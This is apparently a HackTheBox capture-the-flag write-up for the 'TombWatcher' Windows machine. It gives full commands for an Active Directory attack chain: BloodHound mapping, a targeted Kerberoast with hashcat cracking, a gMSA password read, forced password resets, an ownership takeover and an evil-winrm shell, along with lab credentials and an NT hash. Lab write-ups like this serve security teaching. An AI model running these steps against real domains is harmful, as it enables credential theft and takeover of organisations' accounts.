---
title: "TombWatcher"
date: 2026-10-12 07:00:00 -0500
categories: [HackTheBox, Windows]
tags: [hackthebox, windows, medium, active-directory, kerberoasting, writespn, gmsa, bloodhound, acl-abuse, bloodyad]
image:
    path: /assets/Images/TombWatcher-avatar.png
    alt: TombWatcher
description: "Provided domain creds lead through a BloodHound-mapped ACL chain — a WriteSPN targeted Kerberoast cracks alfred, gMSA password disclosure and a string of WriteOwner/ForceChangePassword resets pivot through ansible_dev$, sam, and finally john, whose Remote Management Users membership yields the user flag over WinRM."
---
## Overview

TombWatcher is a medium-difficulty Windows machine built entirely around abusing Active Directory object permissions. We are handed initial credentials, and the route to the user flag is a BloodHound exercise: a `WriteSPN` ACE enables a targeted Kerberoast to crack a second account, which can add itself to a group that can read a gMSA password, which can reset another user, who owns a third user, who is finally a member of `Remote Management Users`. This post covers recon through the user flag.

## Machine Matrix

<div style="text-align:center;margin:1.5rem 0;">
<svg viewBox="-60 0 420 300" width="420" style="max-width:100%;font-family:sans-serif;font-size:13px;">
  <polygon points="150.0,40.0 254.6,116.0 214.7,239.0 85.3,239.0 45.4,116.0" fill="none" stroke="#888" stroke-opacity="0.4"/>
  <polygon points="150.0,76.7 219.7,127.4 193.1,209.3 106.9,209.3 80.3,127.4" fill="none" stroke="#888" stroke-opacity="0.3"/>
  <polygon points="150.0,113.4 184.8,138.7 171.5,179.6 128.5,179.6 115.2,138.7" fill="none" stroke="#888" stroke-opacity="0.3"/>
  <g stroke="#888" stroke-opacity="0.4">
    <line x1="150" y1="150" x2="150.0" y2="40.0"/>
    <line x1="150" y1="150" x2="254.6" y2="116.0"/>
    <line x1="150" y1="150" x2="214.7" y2="239.0"/>
    <line x1="150" y1="150" x2="85.3" y2="239.0"/>
    <line x1="150" y1="150" x2="45.4" y2="116.0"/>
  </g>
  <polygon points="150.0,84.0 254.6,116.0 150.0,150.0 124.1,185.6 150.0,150.0" fill="#9fef00" fill-opacity="0.3" stroke="#9fef00" stroke-width="2"/>
  <g fill="currentColor" text-anchor="middle">
    <text x="150" y="28">Enumeration</text>
    <text x="278" y="112" text-anchor="start">Real-Life</text>
    <text x="226" y="258" text-anchor="start">CVE</text>
    <text x="74" y="258" text-anchor="end">Custom Exploitation</text>
    <text x="22" y="112" text-anchor="end">CTF-like</text>
  </g>
</svg>
</div>

Entirely BloodHound-driven AD ACL chain — targeted Kerberoast, gMSA read, WriteOwner/ForceChangePassword pivots — realistic and tool-assisted, no CVE and little bespoke exploitation.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 53/tcp | DNS | Simple DNS Plus |
| 80/tcp | HTTP | IIS 10.0, default page |
| 88/tcp | Kerberos | DC |
| 135/tcp | msrpc | |
| 139/445 | SMB | |
| 389/636/3268/3269 | LDAP(S) | Domain `tombwatcher.htb`, host `DC01` |
| 464/tcp | kpasswd | |
| 593/tcp | RPC over HTTP | |
| 5985/tcp | WinRM | |

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.x | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.10.11.x
```

The exposed ports are a textbook Windows Domain Controller. The LDAP certificate subject and SAN confirm the host as `DC01.tombwatcher.htb` and the domain as `tombwatcher.htb`. Port 80 is just a default IIS page with nothing to attack. Add the names to `/etc/hosts`:

```bash
echo "10.10.11.x dc01.tombwatcher.htb tombwatcher.htb" | sudo tee -a /etc/hosts
```

## Enumeration

As is common in real-world AD assessments, we start with provided credentials: `henry:H3nry_987TGV!`. With a valid domain account, the first move is to map the environment with BloodHound.

```bash
bloodhound-python -d tombwatcher.htb -dc dc01.tombwatcher.htb -u henry -p 'H3nry_987TGV!' -c All -ns 10.10.11.x --dns-tcp --zip
```

Importing the ZIP and inspecting `henry` reveals a single outbound edge that matters: **`henry` has `WriteSPN` over `alfred`**. `WriteSPN` lets us set a Service Principal Name on `alfred`, which makes the account eligible for Kerberoasting — we can request a TGS encrypted with `alfred`'s password hash and crack it offline.

## Foothold

**1 — Targeted Kerberoast.** `targetedKerberoast.py` automates the whole flow: temporarily write an SPN to `alfred`, request the RC4 service ticket, then clean up the SPN.

```bash
python3 /opt/tools/targetedKerberoast/targetedKerberoast.py -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' --request-user alfred --dc-ip 10.10.11.x
```

This prints a `$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$...` hash. Save it and crack it with hashcat:

```bash
hashcat -a 0 -m 13100 alfred.hash /usr/share/wordlists/rockyou.txt
```

The password falls quickly: `alfred:basketball`.

**2 — alfred → ansible_dev$ (gMSA).** Back in BloodHound, `alfred` can `AddSelf` to the `INFRASTRUCTURE` group, and members of that group hold `ReadGMSAPassword` over the `ansible_dev$` managed service account. A gMSA stores its password in the `msDS-ManagedPassword` attribute, readable only by explicitly authorized principals. We use `bloodyAD` to join the group and read the blob.

```bash
bloodyAD --host 'dc01.tombwatcher.htb' -d 'tombwatcher.htb' -u 'alfred' -p 'basketball' add groupMember 'INFRASTRUCTURE' 'alfred'
bloodyAD --host 'dc01.tombwatcher.htb' -d 'tombwatcher.htb' -u 'alfred' -p 'basketball' get object 'ANSIBLE_DEV$' --attr msDS-ManagedPassword
```

The output yields the NT hash for `ansible_dev$`: `838b2bd83fbe39901be3713e8c79ce37`.

**3 — ansible_dev$ → sam.** `ansible_dev$` has `ForceChangePassword` over `sam`, so we reset `sam` with a password of our choosing (pass-the-hash for the gMSA account):

```bash
bloodyAD --host 'dc01.tombwatcher.htb' -d 'tombwatcher.htb' -u 'ANSIBLE_DEV$' -p ':838b2bd83fbe39901be3713e8c79ce37' set password sam 'P@ssChange1!'
```

**4 — sam → john (WriteOwner).** `sam` has `WriteOwner` over `john`. Ownership implies full control, so we take ownership, grant ourselves `GenericAll`, then reset the password:

```bash
bloodyAD --host 'dc01.tombwatcher.htb' -d 'tombwatcher.htb' -u 'sam' -p 'P@ssChange1!' set owner john sam
bloodyAD --host 'dc01.tombwatcher.htb' -d 'tombwatcher.htb' -u 'sam' -p 'P@ssChange1!' add genericAll john sam
bloodyAD --host 'dc01.tombwatcher.htb' -d 'tombwatcher.htb' -u 'sam' -p 'P@ssChange1!' set password john 'P@ssChange2!'
```

## User flag

`john` is a member of `Remote Management Users`, which grants interactive access over WinRM:

```bash
evil-winrm -i dc01.tombwatcher.htb -u john -p 'P@ssChange2!'
```

```
*Evil-WinRM* PS C:\Users\john\Documents> type C:\Users\john\Desktop\user.txt
[redacted]
```

A shell as `john` and the user flag are ours.

Privilege escalation — abusing `john`'s `GenericAll` over the `ADCS` OU, restoring a deleted `cert_admin` from the AD Recycle Bin, and exploiting ESC15 (CVE-2024-49019) — is left as an exercise; this post stops at user.


<div style="text-align:center;margin-top:2rem;">
  <img src="/assets/Images/TombWatcher-avatar.png" alt="TombWatcher" width="200" height="200" style="border-radius:8px;" />
  <p style="margin-top:1rem;">
    <a href="https://patreon.com/Infinit3i?utm_medium=unknown&utm_source=join_link&utm_campaign=creatorshare_creator&utm_content=copyLink"
       style="display:inline-block;background:#FF424D;color:#fff;font-weight:600;padding:0.6rem 1.4rem;border-radius:9999px;text-decoration:none;">
      Find more on Patreon
    </a>
  </p>
</div>
